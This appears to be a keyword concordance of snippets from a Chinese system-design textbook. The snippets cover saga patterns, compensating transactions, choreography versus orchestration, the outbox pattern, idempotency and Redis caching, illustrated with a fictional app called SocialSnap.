  c15_b05.md: ...aga 设计原则：按可补偿性从强到弱排序步骤，把不可补偿副作用放在最后。**   ### 15.5 编排与编舞  协调 saga 步骤有两种方式：编舞（choreography）与编排（orchestration）。...
  c15_b05.md: ...#### 定义：Saga  **Saga** 是一系列本地事务序列，每个服务一个，合起来实现一个分布式业务操作。每个本地事务更新服务自己的数据库...
  c15_b05.md: ...#### 定义：Saga  **Saga** 是一系列本地事务序列，每个服务一个，合起来实现一个分布式业务操作。每个本地事务更新服务自己的数据库，并发布消息或事...
  c15_b05.md: ...每个服务一个，合起来实现一个分布式业务操作。每个本地事务更新服务自己的数据库，并发布消息或事件触发下一步。如果某步失败，saga 执行**补偿事务**——撤销之前已完成步骤效果反向操作。  plain 语言：不是一个大原子事务整体提交或回滚，sag...
  c15_b05.md: ...aga 执行**补偿事务**——撤销之前已完成步骤效果反向操作。  plain 语言：不是一个大原子事务整体提交或回滚，saga 是一串较小事务。如果链中途失败，你不回滚——而是为已完成步骤运行“撤销”操作。  关键洞见：**补偿事务取代回滚**。...
  c15_b05.md: ...事务：发起退款。  退款并不真正撤销扣款（银行记录仍会显示扣款和退款），但它抵消了业务效果。   #### 高级版升级 Saga  SocialSnap 高级版升级 saga 显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|...
  c15_b05.md: ...记录仍会显示扣款和退款），但它抵消了业务效果。   #### 高级版升级 Saga  SocialSnap 高级版升级 saga 显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|---|---|--- 1 | Payment...
  c15_b05.md: ...` 3 | Notification Service | 发送确认邮件 | （无法补偿——邮件不能撤回。记录问题。）  Saga 执行：第 1 步成功，第 2 步成功，第 3 步失败（邮件服务宕机）。因为第 3 步是最后一步且失败，saga 的补偿...
  c15_b05.md: ...。）  Saga 执行：第 1 步成功，第 2 步成功，第 3 步失败（邮件服务宕机）。因为第 3 步是最后一步且失败，saga 的补偿计划运行：撤销第 2 步（设置 `is_premium = false`），然后撤销第 1 步（发起退款）。用户...
  c15_b05.md: ...级版，也没被扣款。失败被记录。他们可以稍后重试。  但如果第 2 步失败（升级期间 User Service 宕机）呢？saga 补偿：撤销第 1 步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重点：发邮件不可补偿。你不能“取消发送...
  c15_b05.md: ...步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重点：发邮件不可补偿。你不能“取消发送”一封邮件。这是 saga 模式的**真正局限**。标准做法是把不可补偿步骤尽量**放在 saga 最后**。如果“发邮件”是第 3 步（最后），...
  c15_b05.md: ...邮件不可补偿。你不能“取消发送”一封邮件。这是 saga 模式的**真正局限**。标准做法是把不可补偿步骤尽量**放在 saga 最后**。如果“发邮件”是第 3 步（最后），只有第 1、2 步都成功才会发邮件。如果“发邮件”是第 1 步，那么扣款...
  c15_b05.md: ...都成功才会发邮件。如果“发邮件”是第 1 步，那么扣款或账户更新失败前已经发了邮件——而这些失败无法把邮件收回。  **Saga 设计原则：按可补偿性从强到弱排序步骤，把不可补偿副作用放在最后。**   ### 15.5 编排与编舞  协调 sag...
  c15_b05.md: ...aga 设计原则：按可补偿性从强到弱排序步骤，把不可补偿副作用放在最后。**   ### 15.5 编排与编舞  协调 saga 步骤有两种方式：编舞（choreography）与编排（orchestration）。...
  c15_b06.md: ...#### 编舞（Choreography）——Saga 中的服务共舞  在**编舞**中，没有中央协调器。每个服务监听事件，知道发生这些事件时该做什么。saga 的逻辑分布在...
  c15_b06.md: ...aphy）——Saga 中的服务共舞  在**编舞**中，没有中央协调器。每个服务监听事件，知道发生这些事件时该做什么。saga 的逻辑分布在这些服务之间：  1. Checkout Handler 发布 `user.upgrade.initiat...
  c15_b06.md: ...grade.failed` 并发起退款。   #### 定义：编舞  **编舞（Choreography）** 是一种 saga 协调风格：每个服务独立对事件做出反应并发布自己的事件。没有中央控制器。整体 saga 行为由各个服务交互涌现出来。...
  c15_b06.md: ...reography）** 是一种 saga 协调风格：每个服务独立对事件做出反应并发布自己的事件。没有中央控制器。整体 saga 行为由各个服务交互涌现出来。  plain 语言：编舞就像爵士乐队即兴演奏。没人指挥。每个乐手倾听别人，根据听到的演奏...
  c15_b06.md: ...只需知道它们监听的事件）、没有单点故障（没有中央协调器会宕机）、天然适合事件驱动架构（第 8 章的消息队列）。  缺点：saga 逻辑**隐式且分散**。要理解 saga 做什么，你必须读所有服务并追踪跨所有服务的事件流。调试失败 saga 需要在...
  c15_b06.md: ...有中央协调器会宕机）、天然适合事件驱动架构（第 8 章的消息队列）。  缺点：saga 逻辑**隐式且分散**。要理解 saga 做什么，你必须读所有服务并追踪跨所有服务的事件流。调试失败 saga 需要在多个服务间关联日志。增加新步骤要确定监听哪...
  c15_b06.md: ...缺点：saga 逻辑**隐式且分散**。要理解 saga 做什么，你必须读所有服务并追踪跨所有服务的事件流。调试失败 saga 需要在多个服务间关联日志。增加新步骤要确定监听哪个服务的事件、在哪个服务加监听器——并确保不漏掉任何情况。   ###...
  c15_b06.md: ...stration）——中央指挥  在**编排**中，一个中央组件——**编排器（orchestrator）**——协调 saga。编排器显式按顺序调用每个服务，接收结果，决定下一步做什么。  高级版升级编排器：  1. 调用 Payment Ser...
  c15_b06.md: ...#### 编舞（Choreography）——Saga 中的服务共舞  在**编舞**中，没有中央协调器。每个服务监听事件，知道发生这些事件时该做什么。saga 的逻辑分布在...
  c15_b06.md: ...aphy）——Saga 中的服务共舞  在**编舞**中，没有中央协调器。每个服务监听事件，知道发生这些事件时该做什么。saga 的逻辑分布在这些服务之间：  1. Checkout Handler 发布 `user.upgrade.initiat...
  c15_b06.md: ...grade.failed` 并发起退款。   #### 定义：编舞  **编舞（Choreography）** 是一种 saga 协调风格：每个服务独立对事件做出反应并发布自己的事件。没有中央控制器。整体 saga 行为由各个服务交互涌现出来。...
  c15_b06.md: ...reography）** 是一种 saga 协调风格：每个服务独立对事件做出反应并发布自己的事件。没有中央控制器。整体 saga 行为由各个服务交互涌现出来。  plain 语言：编舞就像爵士乐队即兴演奏。没人指挥。每个乐手倾听别人，根据听到的演奏...
  c15_b06.md: ...只需知道它们监听的事件）、没有单点故障（没有中央协调器会宕机）、天然适合事件驱动架构（第 8 章的消息队列）。  缺点：saga 逻辑**隐式且分散**。要理解 saga 做什么，你必须读所有服务并追踪跨所有服务的事件流。调试失败 saga 需要在...
  c15_b06.md: ...有中央协调器会宕机）、天然适合事件驱动架构（第 8 章的消息队列）。  缺点：saga 逻辑**隐式且分散**。要理解 saga 做什么，你必须读所有服务并追踪跨所有服务的事件流。调试失败 saga 需要在多个服务间关联日志。增加新步骤要确定监听哪...
  c15_b06.md: ...缺点：saga 逻辑**隐式且分散**。要理解 saga 做什么，你必须读所有服务并追踪跨所有服务的事件流。调试失败 saga 需要在多个服务间关联日志。增加新步骤要确定监听哪个服务的事件、在哪个服务加监听器——并确保不漏掉任何情况。   ###...
  c15_b06.md: ...stration）——中央指挥  在**编排**中，一个中央组件——**编排器（orchestrator）**——协调 saga。编排器显式按顺序调用每个服务，接收结果，决定下一步做什么。  高级版升级编排器：  1. 调用 Payment Ser...
  c15_b07.md: ...#### 定义：编排  **编排（Orchestration）** 是一种 saga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  pl...
  c15_b07.md: ...#### 定义：编排  **编排（Orchestration）** 是一种 saga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  plain 语言：编排就像有指挥的管弦乐队。...
  c15_b07.md: ...stration）** 是一种 saga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  plain 语言：编排就像有指挥的管弦乐队。指挥告诉小提琴何时演奏、双簧管何时进入、铜管何时...
  c15_b07.md: ...弦乐队。指挥告诉小提琴何时演奏、双簧管何时进入、铜管何时休止。指挥拥有完整乐谱；乐手按指示演奏自己的部分。  编排优点：saga 逻辑**显式且集中**。要理解 saga 做什么，读编排器即可。调试更简单——编排器的状态揭示哪一步失败。增加新步骤只...
  c15_b07.md: ...进入、铜管何时休止。指挥拥有完整乐谱；乐手按指示演奏自己的部分。  编排优点：saga 逻辑**显式且集中**。要理解 saga 做什么，读编排器即可。调试更简单——编排器的状态揭示哪一步失败。增加新步骤只需在一个地方更新编排器。  缺点：编排器是...
  c15_b07.md: ...Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复杂，以及你需要多大可见度。  简单 saga（3-4 步、不频繁、容易追踪）：编舞。松耦合和无需管理新服务的好处超...
  c15_b07.md: ...rvice 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复杂，以及你需要多大可见度。  简单 saga（3-4 步、不频繁、容易追踪）：编舞。松耦合和无需管理新服务的好处超过调试复杂度。  复杂 saga（多步骤、频繁、需...
  c15_b07.md: ...可见度。  简单 saga（3-4 步、不频繁、容易追踪）：编舞。松耦合和无需管理新服务的好处超过调试复杂度。  复杂 saga（多步骤、频繁、需要显式状态追踪）：编排。中央编排器的可调试性和显式性证明耦合与运维开销合理。  实践中，大多数大型系统...
  c15_b07.md: ...编排器用于少数关键、复杂、必须可见的业务流程。   ### 15.6 Outbox 模式——可靠事件发布  上面描述的 saga 模式依赖服务可靠发布事件。但考虑 Payment Service：       BEGIN;         INSE...
  c15_b07.md: ...rge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支付记录已保存但事件从未发布。Saga 卡住——没有事件意味着下一步永远不运行。  另一种顺序：       // Publish event to mess...
  c15_b07.md: ...#### 定义：编排  **编排（Orchestration）** 是一种 saga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  pl...
  c15_b07.md: ...#### 定义：编排  **编排（Orchestration）** 是一种 saga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  plain 语言：编排就像有指挥的管弦乐队。...
  c15_b07.md: ...stration）** 是一种 saga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  plain 语言：编排就像有指挥的管弦乐队。指挥告诉小提琴何时演奏、双簧管何时进入、铜管何时...
  c15_b07.md: ...弦乐队。指挥告诉小提琴何时演奏、双簧管何时进入、铜管何时休止。指挥拥有完整乐谱；乐手按指示演奏自己的部分。  编排优点：saga 逻辑**显式且集中**。要理解 saga 做什么，读编排器即可。调试更简单——编排器的状态揭示哪一步失败。增加新步骤只...
  c15_b07.md: ...进入、铜管何时休止。指挥拥有完整乐谱；乐手按指示演奏自己的部分。  编排优点：saga 逻辑**显式且集中**。要理解 saga 做什么，读编排器即可。调试更简单——编排器的状态揭示哪一步失败。增加新步骤只需在一个地方更新编排器。  缺点：编排器是...
  c15_b07.md: ...Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复杂，以及你需要多大可见度。  简单 saga（3-4 步、不频繁、容易追踪）：编舞。松耦合和无需管理新服务的好处超...
  c15_b07.md: ...rvice 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复杂，以及你需要多大可见度。  简单 saga（3-4 步、不频繁、容易追踪）：编舞。松耦合和无需管理新服务的好处超过调试复杂度。  复杂 saga（多步骤、频繁、需...
  c15_b07.md: ...可见度。  简单 saga（3-4 步、不频繁、容易追踪）：编舞。松耦合和无需管理新服务的好处超过调试复杂度。  复杂 saga（多步骤、频繁、需要显式状态追踪）：编排。中央编排器的可调试性和显式性证明耦合与运维开销合理。  实践中，大多数大型系统...
  c15_b07.md: ...编排器用于少数关键、复杂、必须可见的业务流程。   ### 15.6 Outbox 模式——可靠事件发布  上面描述的 saga 模式依赖服务可靠发布事件。但考虑 Payment Service：       BEGIN;         INSE...
  c15_b07.md: ...rge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支付记录已保存但事件从未发布。Saga 卡住——没有事件意味着下一步永远不运行。  另一种顺序：       // Publish event to mess...
  c15_b09.md: ...Snap 高级版升级——完整实现  把所有内容合起来，SocialSnap 使用编排和 Outbox 模式的高级版升级 saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PENDING` 的 saga...
  c15_b09.md: ...saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PENDING` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premi...
  c15_b09.md: ...步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PENDING` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.st...
  c15_b09.md: ...NG` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.start` 事件并带上 saga ID。HTTP 处理器返回“您的升级正在处理中——...
  c15_b09.md: ...f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.start` 事件并带上 saga ID。HTTP 处理器返回“您的升级正在处理中——请稍后查看。”  **第 2 步：** 消息中继发布 outbox...
  c15_b09.md: ...的消息中继发布该事件。  **第 5 步：** 编排器收到 `payment.charge.succeeded`。更新 saga 记录状态为 `PAYMENT_COMPLETE`。调用 User Service：“设置用户 42 为高级版，幂等键...
  c15_b09.md: ...remium` 事件。  **第 7 步：** 编排器收到 `user.upgraded.to.premium`。更新 saga 记录为 `USER_UPGRADED`。调用 Notification Service：“给用户 42 发送高级版确认...
  c15_b09.md: ...前面步骤成功才会到达这里）。  **第 9 步：** 编排器收到 Notification Service 确认。更新 saga 记录为 `COMPLETE`。用户浏览器轮询升级状态，收到 `COMPLETE` 后显示“欢迎加入高级版！”  该序列...
  c15_b09.md: ...示“欢迎加入高级版！”  该序列中任何失败点，编排器都会通过超时或显式失败事件检测到失败，按相反顺序执行补偿事务，并把 saga 标记为 `FAILED`。用户看到合适的错误信息，不会被扣款。   ### 15.8 权衡矩阵更新  策略 | 收益...
  c15_b09.md: ...列 | 把工作从请求处理解耦；重试逻辑；突发缓冲 | 最终处理；更难调试；需要幂等性 | 长运行操作；有外部依赖的操作 Saga 模式 | 无需 2PC 的分布式多服务工作流 | 没有真正原子性（可见中间状态）；补偿逻辑复杂 | 必须在无共享事务下...
  c15_b09.md: ...Snap 高级版升级——完整实现  把所有内容合起来，SocialSnap 使用编排和 Outbox 模式的高级版升级 saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PENDING` 的 saga...
  c15_b09.md: ...saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PENDING` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premi...
  c15_b09.md: ...步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PENDING` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.st...
  c15_b09.md: ...NG` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.start` 事件并带上 saga ID。HTTP 处理器返回“您的升级正在处理中——...
  c15_b09.md: ...f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.start` 事件并带上 saga ID。HTTP 处理器返回“您的升级正在处理中——请稍后查看。”  **第 2 步：** 消息中继发布 outbox...
  c15_b09.md: ...的消息中继发布该事件。  **第 5 步：** 编排器收到 `payment.charge.succeeded`。更新 saga 记录状态为 `PAYMENT_COMPLETE`。调用 User Service：“设置用户 42 为高级版，幂等键...
  c15_b09.md: ...remium` 事件。  **第 7 步：** 编排器收到 `user.upgraded.to.premium`。更新 saga 记录为 `USER_UPGRADED`。调用 Notification Service：“给用户 42 发送高级版确认...
  c15_b09.md: ...前面步骤成功才会到达这里）。  **第 9 步：** 编排器收到 Notification Service 确认。更新 saga 记录为 `COMPLETE`。用户浏览器轮询升级状态，收到 `COMPLETE` 后显示“欢迎加入高级版！”  该序列...
  c15_b09.md: ...示“欢迎加入高级版！”  该序列中任何失败点，编排器都会通过超时或显式失败事件检测到失败，按相反顺序执行补偿事务，并把 saga 标记为 `FAILED`。用户看到合适的错误信息，不会被扣款。   ### 15.8 权衡矩阵更新  策略 | 收益...
  c15_b09.md: ...列 | 把工作从请求处理解耦；重试逻辑；突发缓冲 | 最终处理；更难调试；需要幂等性 | 长运行操作；有外部依赖的操作 Saga 模式 | 无需 2PC 的分布式多服务工作流 | 没有真正原子性（可见中间状态）；补偿逻辑复杂 | 必须在无共享事务下...
  c15_b10.md: ...复而永远不处理。键必须唯一标识某次特定尝试，通常组合用户 ID、操作类型和每次尝试的随机值或时间戳。  **Q3.** Saga 用补偿事务代替回滚。举出一种不能补偿的操作，并解释原因。  **答案：** 发送邮件不能补偿。一旦邮件投递到收件人邮箱...
  c15_b11.md: ...一般而言，任何造成可见、外部可观察副作用且发起系统无法逆转的操作都是不可补偿的。这就是 saga 设计原则要把不可补偿步骤放在最后的原因——只有所有可补偿步骤成功后才会执行它们。  **Q4.** 解释双写问题。为什...
  c15_b12.md: ...；(b) 在用户服务中更新用户 B 的关注者数；(c) 通过通知服务发送“你有新关注者！”通知。把这个设计成基于编舞的 saga，画出服务间流动的事件。  提示  从初始触发事件开始，追踪每个服务的反应及它发布的事件。  **答案：** 基于编舞的...
  c15_b12.md: ...流动的事件。  提示  从初始触发事件开始，追踪每个服务的反应及它发布的事件。  **答案：** 基于编舞的“关注用户”Saga：  **触发：** “关注”按钮的 HTTP 处理器收到请求。在 API Gateway 数据库中插入 pending...
  c15_b12.md: ...步成功后失败：关注者数已更新，但通知没发送。这是可接受的（通知失败可容忍——关注本身成功了）。通知重试逻辑单独处理通知。saga 即使通知失败也被视为“成功”。  **观察：** 这个 saga 设计认识到通知是补充的——核心关注动作（图更新 +...
  c15_b12.md: ...可容忍——关注本身成功了）。通知重试逻辑单独处理通知。saga 即使通知失败也被视为“成功”。  **观察：** 这个 saga 设计认识到通知是补充的——核心关注动作（图更新 + 计数更新）才是必要部分。通知失败不触发补偿。并非所有失败都需要回滚...
  c15_b12.md: ...才是必要部分。通知失败不触发补偿。并非所有失败都需要回滚一切。  **Q2.** 把本章“向用户收费并发送确认邮件”的 saga 重写为基于编排的 saga。你的编排器必须正确处理以下失败场景：(a) 支付扣款失败（Payment Service...
  c15_b12.md: ...补偿。并非所有失败都需要回滚一切。  **Q2.** 把本章“向用户收费并发送确认邮件”的 saga 重写为基于编排的 saga。你的编排器必须正确处理以下失败场景：(a) 支付扣款失败（Payment Service 返回错误）；(b) 支付成功...
  c15_b12.md: ...Service 返回错误）；(b) 支付成功但 User Service 不可用；(c) 所有步骤成功，但编排器在标记 saga 完成前崩溃。  提示  编排器必须持久化其状态（当前所在步骤），以便崩溃后恢复。  **答案：** 基于编排的高级版升...
  c15_b12.md: ...成前崩溃。  提示  编排器必须持久化其状态（当前所在步骤），以便崩溃后恢复。  **答案：** 基于编排的高级版升级 saga——完整设计：...
  c15_b12.md: ...；(b) 在用户服务中更新用户 B 的关注者数；(c) 通过通知服务发送“你有新关注者！”通知。把这个设计成基于编舞的 saga，画出服务间流动的事件。  提示  从初始触发事件开始，追踪每个服务的反应及它发布的事件。  **答案：** 基于编舞的...
  c15_b12.md: ...流动的事件。  提示  从初始触发事件开始，追踪每个服务的反应及它发布的事件。  **答案：** 基于编舞的“关注用户”Saga：  **触发：** “关注”按钮的 HTTP 处理器收到请求。在 API Gateway 数据库中插入 pending...
  c15_b12.md: ...步成功后失败：关注者数已更新，但通知没发送。这是可接受的（通知失败可容忍——关注本身成功了）。通知重试逻辑单独处理通知。saga 即使通知失败也被视为“成功”。  **观察：** 这个 saga 设计认识到通知是补充的——核心关注动作（图更新 +...
  c15_b12.md: ...可容忍——关注本身成功了）。通知重试逻辑单独处理通知。saga 即使通知失败也被视为“成功”。  **观察：** 这个 saga 设计认识到通知是补充的——核心关注动作（图更新 + 计数更新）才是必要部分。通知失败不触发补偿。并非所有失败都需要回滚...
  c15_b12.md: ...才是必要部分。通知失败不触发补偿。并非所有失败都需要回滚一切。  **Q2.** 把本章“向用户收费并发送确认邮件”的 saga 重写为基于编排的 saga。你的编排器必须正确处理以下失败场景：(a) 支付扣款失败（Payment Service...
  c15_b12.md: ...补偿。并非所有失败都需要回滚一切。  **Q2.** 把本章“向用户收费并发送确认邮件”的 saga 重写为基于编排的 saga。你的编排器必须正确处理以下失败场景：(a) 支付扣款失败（Payment Service 返回错误）；(b) 支付成功...
  c15_b12.md: ...Service 返回错误）；(b) 支付成功但 User Service 不可用；(c) 所有步骤成功，但编排器在标记 saga 完成前崩溃。  提示  编排器必须持久化其状态（当前所在步骤），以便崩溃后恢复。  **答案：** 基于编排的高级版升...
  c15_b12.md: ...成前崩溃。  提示  编排器必须持久化其状态（当前所在步骤），以便崩溃后恢复。  **答案：** 基于编排的高级版升级 saga——完整设计：...
  c15_b13.md: ...询所有 `current_step != COMPLETE AND current_step != FAILED` 的 saga。它发现 `saga_7f3a9b2c` 仍处于 `EMAIL_PENDING`（COMPLETE 之前的最后一步）。它...
  c15_b13.md: ...ervice 的幂等检查返回“已发送”而不发送重复邮件。编排器设置 `current_step = COMPLETE`。Saga 正确完成。  **关键设计决策：**  * 发起调用前先持久化状态转换（以便崩溃恢复知道当前位置）。 * 所有服务调用...
  c15_b13.md: ...便崩溃恢复知道当前位置）。 * 所有服务调用都使用幂等键（幂等性）保证重试安全。 * 启动时运行恢复进程以恢复被中断的 saga。  **Q3.** 团队正在为 API 实现幂等键（idempotency keys，幂等性）。一位工程师提议：“我们...
  c15_b13.md: ...询所有 `current_step != COMPLETE AND current_step != FAILED` 的 saga。它发现 `saga_7f3a9b2c` 仍处于 `EMAIL_PENDING`（COMPLETE 之前的最后一步）。它...
  c15_b13.md: ...ervice 的幂等检查返回“已发送”而不发送重复邮件。编排器设置 `current_step = COMPLETE`。Saga 正确完成。  **关键设计决策：**  * 发起调用前先持久化状态转换（以便崩溃恢复知道当前位置）。 * 所有服务调用...
  c15_b13.md: ...便崩溃恢复知道当前位置）。 * 所有服务调用都使用幂等键（幂等性）保证重试安全。 * 启动时运行恢复进程以恢复被中断的 saga。  **Q3.** 团队正在为 API 实现幂等键（idempotency keys，幂等性）。一位工程师提议：“我们...
  c15_b15.md: ...#### 深入思考  **Q1.** 本章指出 saga 中的不可补偿步骤（如发邮件）应尽可能放在最后。这一规则是否总是正确？能否构造一个场景，使该规则与另一重要设计原则冲突？...
  c15_b15.md: ...第 1、2 步成功，邮件才在完全成功的事务路径上发送。  但该规则可能与**客户沟通与透明性**原则冲突。考虑电商订单 saga：第 1 步信用卡扣款（可退款补偿），第 2 步预留库存，第 3 步发起发货，第 4 步发送“您的订单已下单！”邮件。按...
  c15_b15.md: ...邮件在第 4 步（最后）。  但如果第 3 步（发货）失败呢？客户已被扣款，库存已预留，但发货无法启动（仓库系统宕机）。Saga 补偿：退款、释放库存。客户从未收到邮件。他们不知道订单曾被尝试、扣款、然后取消。他们只看到信用卡账单有一笔不明扣款。从...
  c15_b15.md: ...永久业务后果的操作（扣款、承担法律义务）正确。对透明性重要的客户沟通，必须权衡沉默带来的客户体验成本。更好的规则：设计 saga，使面向客户的沟通匹配业务状态——先发送“订单处理中”（试探性）邮件，只在所有可补偿步骤成功后才发送“订单已确认”（确定...
  c15_b15.md: ...——先发送“订单处理中”（试探性）邮件，只在所有可补偿步骤成功后才发送“订单已确认”（确定性）邮件。  **Q2.** Saga 编排把流程逻辑集中在一个服务中。怀疑者争论：“这只是重新创建单体里的集中逻辑——我们转向微服务就是为了摆脱这个。编排器...
  c15_b15.md: ...细节。”评价这一争论。  **讨论：** 怀疑者指出了一个真实张力。一个知道其他五个服务 API、数据模型和失败模式的 saga 编排器确实与它们耦合。如果 Payment Service API 改变，编排器也要改。编排器不能独立于它编排的服务部...
  c15_b15.md: ...#### 深入思考  **Q1.** 本章指出 saga 中的不可补偿步骤（如发邮件）应尽可能放在最后。这一规则是否总是正确？能否构造一个场景，使该规则与另一重要设计原则冲突？...
  c15_b15.md: ...第 1、2 步成功，邮件才在完全成功的事务路径上发送。  但该规则可能与**客户沟通与透明性**原则冲突。考虑电商订单 saga：第 1 步信用卡扣款（可退款补偿），第 2 步预留库存，第 3 步发起发货，第 4 步发送“您的订单已下单！”邮件。按...
  c15_b15.md: ...邮件在第 4 步（最后）。  但如果第 3 步（发货）失败呢？客户已被扣款，库存已预留，但发货无法启动（仓库系统宕机）。Saga 补偿：退款、释放库存。客户从未收到邮件。他们不知道订单曾被尝试、扣款、然后取消。他们只看到信用卡账单有一笔不明扣款。从...
  c15_b15.md: ...永久业务后果的操作（扣款、承担法律义务）正确。对透明性重要的客户沟通，必须权衡沉默带来的客户体验成本。更好的规则：设计 saga，使面向客户的沟通匹配业务状态——先发送“订单处理中”（试探性）邮件，只在所有可补偿步骤成功后才发送“订单已确认”（确定...
  c15_b15.md: ...——先发送“订单处理中”（试探性）邮件，只在所有可补偿步骤成功后才发送“订单已确认”（确定性）邮件。  **Q2.** Saga 编排把流程逻辑集中在一个服务中。怀疑者争论：“这只是重新创建单体里的集中逻辑——我们转向微服务就是为了摆脱这个。编排器...
  c15_b15.md: ...细节。”评价这一争论。  **讨论：** 怀疑者指出了一个真实张力。一个知道其他五个服务 API、数据模型和失败模式的 saga 编排器确实与它们耦合。如果 Payment Service API 改变，编排器也要改。编排器不能独立于它编排的服务部...
  c15_b16.md: ...Saga 编排器拥有行为耦合——它知道 API 调用序列。这类似于任何按顺序调用多个 API 的客户端。Web 浏览器加载页面时...
  c15_b16.md: ...等：每次操作尝试的唯一标识符让服务器检测并去重重试。Outbox 模式解决双写问题，无需分布式事务即可可靠发布事件。  Saga 模式用补偿事务代替回滚，协调无需 2PC 的多服务工作流。编舞通过事件把协调逻辑分布到各服务；编排把它集中在编排器服务...
  c15_b16.md: ...SocialSnap 开篇的“向用户收费并发送确认邮件”问题——本章开头的 Thread A 例子——现在完全可解：saga 配编排器、每次服务调用带幂等键、用 Outbox 模式可靠发布事件、用补偿事务（用户升级失败则退款）恢复失败。  第...
  c15_b16.md: ...Saga 编排器拥有行为耦合——它知道 API 调用序列。这类似于任何按顺序调用多个 API 的客户端。Web 浏览器加载页面时...
  c15_b16.md: ...等：每次操作尝试的唯一标识符让服务器检测并去重重试。Outbox 模式解决双写问题，无需分布式事务即可可靠发布事件。  Saga 模式用补偿事务代替回滚，协调无需 2PC 的多服务工作流。编舞通过事件把协调逻辑分布到各服务；编排把它集中在编排器服务...
  c15_b16.md: ...SocialSnap 开篇的“向用户收费并发送确认邮件”问题——本章开头的 Thread A 例子——现在完全可解：saga 配编排器、每次服务调用带幂等键、用 Outbox 模式可靠发布事件、用补偿事务（用户升级失败则退款）恢复失败。  第...
  c28_b12.md: ...| 极高（两次网络往返） | 强（分布式 ACID） | 低——任何参与者失败阻塞提交 | 极高——协调者故障风险 **Saga pattern** (Ch 14) | 中（顺序补偿） | 最终（补偿事务） | 高 | 高——补偿事务设计 **Ci...

=== user (125 occurrences) ===
  c02_b10.md: ...**翻了不止三倍**。  **Step 3（第三步）：架构改动。**  把通知服务从同步结账路径移除。从：       User → Payment Service → Notification Service → "Order confirmed...
  c02_b10.md: ...→ Notification Service → "Order confirmed"   改成异步模式：       User → Payment Service → (publish "order placed" event to queue)...
  c06_b03.md: ...到一个 value。value 是不透明的——数据库存储它而不理解其结构。你通过 key 取回它。       SET user:1:session_token "abc123xyz"     GET user:1:session_token →...
  c06_b03.md: ...key 取回它。       SET user:1:session_token "abc123xyz"     GET user:1:session_token → "abc123xyz"      SET post:101:like_count...
  c07_b07.md: ...PostgreSQL 实例为此挣扎。  SocialSnap v2 架构把 Redis 加为分布式缓存：       User Request         ↓     Application Server         ↓ (check c...
  c07_b07.md: ...def get_user_profile(user_id):         cache_key = f"user:{user_id}:profile"          # Check cache         cached =...
  c07_b15.md: ...Feed 是 per-user 的——每个用户看到不同 Feed。这意味着每个用户一个缓存 key。想想 Feed 多久变化：用户网络中某处有新帖子。...
  c07_b15.md: ...新帖子都要使每个粉丝的 Feed 缓存失效吗？在什么规模下这变得不可行？  **答案：**  **缓存 key：** `user:{user_id}:feed` —— 每个用户一个条目，存储 Top 50 帖子 ID 及其排序分的序列化列表。  *...
  c07_b15.md: ...L 自然过期。对普通用户（粉丝 <1,000），发帖时使其粉丝的 Feed 缓存失效是可行的：对每个粉丝执行 `DEL user:{follower_id}:feed`。这确保粉丝更快看到新帖，同时没有惊群风险。  **为什么这能降低 >90% 负...
  c07_b17.md: ...ce”指示）   2. 没有个性化的“为你推荐”区块   3. 响应体中不能包含 CSRF token 或其他 per-user 安全令牌  已登录用户不能直接使用 CDN 缓存版本，因为他们期望页面显示他们与 Alice 的关系（关注/取消关注按...
  c08_b07.md: ...单的（概念上：由数据库或 Redis 支撑的持久队列）——还不是 Kafka，但原理相同。  新注册流程：       User submits signup form         ↓     Application Server (HTTP...
  c08_b07.md: ...↓     Application Server (HTTP handler)         ↓ 1. Insert user into PostgreSQL (REQUIRED — user must exist)         ↓ 2. P...
  c08_b07.md: ...ndler)         ↓ 1. Insert user into PostgreSQL (REQUIRED — user must exist)         ↓ 2. Publish "user.signup" event to mes...
  c08_b07.md: ...stgreSQL (REQUIRED — user must exist)         ↓ 2. Publish "user.signup" event to message queue (fast, ~2ms)         ↓     R...
  c08_b07.md: ..., ~2ms)         ↓     Return HTTP 200 "Account created!" to user         ↓     (Meanwhile, in the background...)     Queue C...
  c08_b07.md: ...ound...)     Queue Consumer: Email Service         ← reads "user.signup" event from queue         ← sends welcome email (300...
